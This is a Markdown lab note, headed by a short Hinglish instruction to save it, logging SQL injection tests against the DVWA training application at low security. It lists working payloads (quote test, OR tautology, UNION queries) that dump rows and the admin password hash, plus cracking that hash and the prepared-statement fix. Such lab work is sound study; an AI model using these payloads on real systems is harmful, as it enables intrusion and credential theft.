---

### File 2: `sql_injection_notes.md`

Is text ko copy karke ek aur nayi file banayein aur usko **`sql_injection_notes.md`** naam se save kar lein.

```markdown
# SQL Injection Payload Log & Technical Analysis

## Target System Information
* **Target Module**: DVWA - SQL Injection
* **Security Setting**: Low
* **Database Engine**: MariaDB / MySQL

---

## Payload Execution Log

### Test 1: Vulnerability Detection (Single Quote Test)
* **Payload**: `'`
* **Observation**: Web page returned a database error:  
  `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version...`
* **Conclusion**: Input field is vulnerable to SQL Injection due to lack of escaping/parameterization.

---

### Test 2: Authentication Bypass / Dump All Rows
* **Payload**: `1' OR '1'='1`
* **Type**: In-Band / Boolean-based SQLi
* **Output Extracted**:
  * ID: 1, Name: admin admin
  * ID: 2, Name: Gordon Brown
  * ID: 3, Name: Hack Me
  * ID: 4, Name: Pablo Piccolo
  * ID: 5, Name: Bob Smith

---

### Test 3: Fingerprinting Database Metadata
* **Payload**: `1' UNION SELECT version(), database() #`
* **Type**: UNION-based SQLi
* **Output Extracted**:
  * Database Version: MariaDB/MySQL Server Version
  * Current Database Name: `dvwa`

---

### Test 4: Extracting User Credentials
* **Payload**: `1' UNION SELECT user, password FROM users #`
* **Type**: UNION-based SQLi
* **Output Extracted**:
  * Admin MD5 Hash: `5f4dcc3b5aa765d61d8327deb882cf99`
  * Cracked Hash Result (CrackStation): `password`

---

## Summary of Findings
1. **Root Cause**: Unsanitized user input concatenated into dynamic SQL string.
2. **Impact**: Full database exposure including password hashes.
3. **Fix Required**: Conversion of dynamic SQL queries to Prepared Statements.
